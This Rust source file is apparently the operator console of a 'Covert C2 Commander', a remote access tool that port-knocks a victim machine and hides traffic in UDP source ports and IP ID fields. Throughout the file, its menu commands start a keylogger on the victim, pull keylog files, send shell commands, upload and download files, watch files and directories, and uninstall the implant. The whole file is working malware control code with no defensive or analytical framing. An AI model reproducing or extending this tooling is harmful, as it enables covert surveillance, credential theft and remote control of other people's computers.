use std::io::{self, Write};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use std::fs;
use pnet::transport::{transport_channel, TransportChannelType::Layer3};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::Packet;
use pnet::datalink;

mod port_knkr;
mod keylogger;
mod covert;

use port_knkr::KnockSession;

// Command Codes
const CMD_START_LOGGER:     u8 = 0x10;
const CMD_STOP_LOGGER:      u8 = 0x20;
const CMD_UNINSTALL:        u8 = 0x30;
const CMD_REQUEST_KEYLOG:   u8 = 0x50;
const CMD_UPLOAD_FILE:      u8 = 0x60;
const CMD_DOWNLOAD_FILE:    u8 = 0x70;
const CMD_WATCH_FILE:       u8 = 0x80;
const CMD_WATCH_DIR:        u8 = 0x90;
const CMD_STOP_WATCH:       u8 = 0x91;

// File Transfer Metadata
const CHUNK_SIZE: usize = 28;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    running: Arc<AtomicBool>,
    tx_port: u16,
    rx_port: u16,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            running: Arc::new(AtomicBool::new(false)),
            tx_port: 0,
            rx_port: 0,
        }
    }

    /// Send covert data via UDP request packets, receive ACK via UDP response
    fn send_covert_data(&self, payload: &[u8]) -> Result<(), String> {
        let victim_ip = self.victim_ip.ok_or("No victim IP")?;
        let local_ip = self.local_ip.ok_or("No local IP")?;
        
        let mut state = covert::SenderState::new_from_bytes(payload);
        let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
        let (mut tx, mut rx) = transport_channel(65535, protocol)
            .map_err(|e| e.to_string())?;
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        while state.has_next() && self.running.load(Ordering::SeqCst) {
            if let Some((ip_id, raw_word, masked_word)) = state.chunk_to_send() {
                let mut acked = false;
                let mut attempts = 0;

                while !acked && attempts < 5 {
                    attempts += 1;
                    
                    // UDP: covert data hidden in source port (lower 16 bits of masked_word)
                    let pkt = covert::build_udp_request_packet(
                        local_ip,
                        victim_ip,
                        self.rx_port,  // base destination port
                        ip_id,         // covert carrier in IP ID field
                        masked_word,   // covert data in UDP source port
                    );
                    
                    let _ = tx.send_to(
                        pnet::packet::ipv4::Ipv4Packet::new(&pkt).unwrap(),
                        IpAddr::V4(victim_ip)
                    );

                    let start = std::time::Instant::now();
                    while start.elapsed() < Duration::from_millis(800) {
                        if let Ok((packet, _)) = rx_iter.next() {
                            if packet.get_source() == IpAddr::V4(victim_ip) {
                                // UDP: signature in destination port field
                                if let Some(recv_sig) = covert::parse_udp_response_signature(packet.packet()) {
                                    let expected_sig = covert::signature_ip_id(ip_id, raw_word);
                                    if recv_sig == expected_sig {
                                        state.ack();
                                        acked = true;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
                
                if !acked { 
                    return Err("Failed to send chunk after 5 attempts".to_string());
                }
            }
        }
        Ok(())
    }

    /// Send file to victim in chunks with metadata header
    fn upload_file_to_victim(&self, local_path: &str, remote_path: &str) -> Result<(), String> {
        println!("[*] Uploading {} -> {}:{}...", local_path, self.victim_ip.unwrap(), remote_path);
        
        let file_data = fs::read(local_path)
            .map_err(|e| format!("Failed to read file: {}", e))?;
        
        let remote_path_bytes = remote_path.as_bytes();
        let mut header = Vec::new();
        header.push(CMD_UPLOAD_FILE);
        header.push(remote_path_bytes.len() as u8);
        header.extend_from_slice(remote_path_bytes);
        
        self.send_covert_data(&header)?;
        println!("[+] Metadata sent");
        
        let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
        for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
            print!("\r[*] Uploading chunk {}/{}...", i + 1, total_chunks);
            io::stdout().flush().unwrap();
            self.send_covert_data(chunk)?;
        }
        
        self.send_covert_data(&[0xFF])?;
        println!("\n[+] File upload complete!");
        Ok(())
    }

    /// Request file from victim
    fn download_file_from_victim(&self, remote_path: &str, local_path: &str) -> Result<(), String> {
        println!("[*] Downloading {}:{} -> {}...", self.victim_ip.unwrap(), remote_path, local_path);
        
        let remote_path_bytes = remote_path.as_bytes();
        let mut request = Vec::new();
        request.push(CMD_DOWNLOAD_FILE);
        request.push(remote_path_bytes.len() as u8);
        request.extend_from_slice(remote_path_bytes);
        
        self.send_covert_data(&request)?;
        println!("[+] Download request sent");
        
        self.receive_file_from_victim(local_path)
    }

    /// Receive file data from victim (called after download request)
    fn receive_file_from_victim(&self, local_path: &str) -> Result<(), String> {
        let target_ip = self.victim_ip.unwrap();
        let local_ip = self.local_ip.unwrap();
        let rx_port = self.rx_port;
        let running = self.running.clone();
        
        let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
        let (mut tx, mut rx) = transport_channel(65535, protocol).map_err(|e| e.to_string())?;
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
        let mut receiver_state = covert::ReceiverState::new();
        let mut file_data = Vec::new();
        let mut metadata_received = false;
        let mut expected_size: Option<usize> = None;

        println!("[*] Waiting for file data...");
        let start = std::time::Instant::now();
        
        while running.load(Ordering::SeqCst) && start.elapsed() < Duration::from_secs(60) {
            if let Ok((packet, _)) = rx_iter.next() {
                if packet.get_source() == IpAddr::V4(target_ip) {
                    // UDP: parse UDP request packet instead of TCP SYN
                    if let Some(parsed) = covert::parse_udp_request_from_ipv4_packet(packet.packet()) {
                        if parsed.dst_port == rx_port {
                            // UDP: covert data in source port field (cast to u32 for unmasking)
                            let unmasked = covert::unmask_word(parsed.src_port as u32, parsed.ip_id);
                            
                            if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
                                // UDP: build response packet with signature in destination port
                                let ack_pkt = covert::build_udp_response_packet(
                                    local_ip,
                                    target_ip,
                                    rx_port,
                                    sig_id,  // signature goes in UDP destination port
                                );
                                let _ = tx.send_to(
                                    pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt).unwrap(),
                                    IpAddr::V4(target_ip)
                                );

                                if receiver_state.complete {
                                    let chunk = receiver_state.buffer.clone();
                                    
                                    if chunk.len() == 1 && chunk[0] == 0xFF {
                                        break;
                                    }
                                    
                                    if !metadata_received {
                                        if chunk.len() >= 4 {
                                            expected_size = Some(u32::from_be_bytes([chunk[0], chunk[1], chunk[2], chunk[3]]) as usize);
                                            file_data.extend_from_slice(&chunk[4..]);
                                            metadata_received = true;
                                            println!("[+] Expected size: {} bytes", expected_size.unwrap());
                                        }
                                    } else {
                                        file_data.extend_from_slice(&chunk);
                                    }
                                    
                                    receiver_state = covert::ReceiverState::new();
                                    
                                    if let Some(size) = expected_size {
                                        if file_data.len() >= size {
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        fs::write(local_path, &file_data)
            .map_err(|e| format!("Failed to write file: {}", e))?;
        
        println!("[+] File download complete! Saved to {}", local_path);
        Ok(())
    }

    /// Start watching a file on victim
    fn watch_file_on_victim(&self, remote_path: &str) -> Result<(), String> {
        println!("[*] Watching file: {}:{}...", self.victim_ip.unwrap(), remote_path);
        
        let mut request = Vec::new();
        request.push(CMD_WATCH_FILE);
        request.push(remote_path.as_bytes().len() as u8);
        request.extend_from_slice(remote_path.as_bytes());
        
        self.send_covert_data(&request)?;
        println!("[+] Watch request sent. Updates will appear below:");
        Ok(())
    }

    /// Start watching a directory on victim
    fn watch_directory_on_victim(&self, remote_path: &str) -> Result<(), String> {
        println!("[*] Watching directory: {}:{}...", self.victim_ip.unwrap(), remote_path);
        
        let mut request = Vec::new();
        request.push(CMD_WATCH_DIR);
        request.push(remote_path.as_bytes().len() as u8);
        request.extend_from_slice(remote_path.as_bytes());
        
        self.send_covert_data(&request)?;
        println!("[+] Watch request sent. Updates will appear below:");
        Ok(())
    }

    /// Stop watching on victim
    fn stop_watch_on_victim(&self) -> Result<(), String> {
        println!("[*] Stopping file watch...");
        self.send_covert_data(&[CMD_STOP_WATCH])?;
        println!("[+] Watch stopped");
        Ok(())
    }

    fn spawn_listener(&self) {
        let running = self.running.clone();
        let target_ip = self.victim_ip.unwrap();
        let local_ip = self.local_ip.unwrap();
        let rx_port = self.rx_port;

        thread::spawn(move || {
            let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
            let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
            let mut receiver_state = covert::ReceiverState::new();

            while running.load(Ordering::SeqCst) {
                if let Ok((packet, _)) = rx_iter.next() {
                    if packet.get_source() == IpAddr::V4(target_ip) {
                        if let Some(parsed) = covert::parse_udp_request_from_ipv4_packet(packet.packet()) {
                            if parsed.dst_port == rx_port {
                                let unmasked = covert::unmask_word(parsed.src_port as u32, parsed.ip_id);
                                
                                if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
                                    let ack_pkt = covert::build_udp_response_packet(
                                        local_ip,
                                        target_ip,
                                        rx_port,
                                        sig_id,
                                    );
                                    let _ = tx.send_to(
                                        pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt).unwrap(),
                                        IpAddr::V4(target_ip)
                                    );

                                    if receiver_state.complete {
                                        if let Ok(msg) = receiver_state.message_str() {
                                            println!("\n[Incoming] {}", msg);
                                        }
                                        receiver_state = covert::ReceiverState::new();
                                    }
                                }
                            }
                        }
                    }
                }
            }
        });
    }

    pub fn run(&mut self) {
        println!("=== Covert C2 Commander ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n1) Initiate session (Port Knock)");
        println!("0) Exit");
        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n--- Connected to {:?} ---", self.victim_ip);
        println!("1) Start Keylogger");
        println!("2) Stop Keylogger");
        println!("3) Request Keylog File");
        println!("4) Run Shell Command");
        println!("5) Upload File to Victim");
        println!("6) Download File from Victim");
        println!("7) Watch File on Victim");
        println!("8) Watch Directory on Victim");
        println!("9) Stop Watching");
        println!("10) Uninstall");
        println!("11) Disconnect");
        match prompt("Selection > ").as_str() {
            "1" => self.start_keylogger(),
            "2" => self.stop_keylogger(),
            "3" => self.request_keylog_file(),
            "4" => self.run_program(),
            "5" => self.upload_file(),
            "6" => self.download_file(),
            "7" => self.watch_file(),
            "8" => self.watch_directory(),
            "9" => self.stop_watch(),
            "10" => self.uninstall(),
            "11" => self.disconnect(),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let target_ip_str = prompt("Target IP [127.0.0.1]: ");
        let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

        match port_knkr::port_knock(ip) {
            Ok(session) => {
                self.victim_ip = Some(ip);
                self.tx_port = session.tx_port;
                self.rx_port = session.rx_port;
                self.knock_session = Some(session);
                
                if let Some((_, local_v4)) = Self::find_interface_for_target(ip) {
                    self.local_ip = Some(local_v4);
                } else {
                    self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
                }

                self.running.store(true, Ordering::SeqCst);
                self.state = SessionState::Connected;
                self.spawn_listener(); 
                println!("[+] Knock Active. Ports -> Target Listener (TX): {}, Local Listener (RX): {}", self.tx_port, self.rx_port);
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
        let interfaces = datalink::interfaces();
        for iface in &interfaces {
            for ip_net in &iface.ips {
                if let IpAddr::V4(local_v4) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target)) || local_v4.is_loopback() {
                        return Some((iface.name.clone(), local_v4));
                    }
                }
            }
        }
        None
    }

    fn start_keylogger(&mut self) { let _ = self.send_covert_data(&[CMD_START_LOGGER]); }
    fn stop_keylogger(&mut self) { let _ = self.send_covert_data(&[CMD_STOP_LOGGER]); }
    fn request_keylog_file(&mut self) { let _ = self.send_covert_data(&[CMD_REQUEST_KEYLOG]); }
    
    fn run_program(&mut self) {
        let cmd = prompt("Command: ");
        if !cmd.is_empty() {
            let _ = self.send_covert_data(cmd.as_bytes());
            println!("[*] Command sent. Listening for response...");
        }
    }

    fn upload_file(&mut self) {
        let local_path = prompt("Local file path: ");
        let remote_path = prompt("Remote file path: ");
        if !local_path.is_empty() && !remote_path.is_empty() {
            match self.upload_file_to_victim(&local_path, &remote_path) {
                Ok(_) => println!("[+] Upload successful"),
                Err(e) => println!("[!] Upload failed: {}", e),
            }
        }
    }

    fn download_file(&mut self) {
        let remote_path = prompt("Remote file path: ");
        let local_path = prompt("Local save path: ");
        if !remote_path.is_empty() && !local_path.is_empty() {
            match self.download_file_from_victim(&remote_path, &local_path) {
                Ok(_) => println!("[+] Download successful"),
                Err(e) => println!("[!] Download failed: {}", e),
            }
        }
    }

    fn watch_file(&mut self) {
        let remote_path = prompt("File path to watch: ");
        if !remote_path.is_empty() {
            match self.watch_file_on_victim(&remote_path) {
                Ok(_) => println!("[+] Watch started"),
                Err(e) => println!("[!] Watch failed: {}", e),
            }
        }
    }

    fn watch_directory(&mut self) {
        let remote_path = prompt("Directory path to watch: ");
        if !remote_path.is_empty() {
            match self.watch_directory_on_victim(&remote_path) {
                Ok(_) => println!("[+] Watch started"),
                Err(e) => println!("[!] Watch failed: {}", e),
            }
        }
    }

    fn stop_watch(&mut self) {
        let _ = self.stop_watch_on_victim();
    }

    fn uninstall(&mut self) {
        let _ = self.send_covert_data(&[CMD_UNINSTALL]);
        self.disconnect();
    }
    
    fn disconnect(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        if let Some(ref session) = self.knock_session { session.stop(); }
        self.state = SessionState::Disconnected;
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
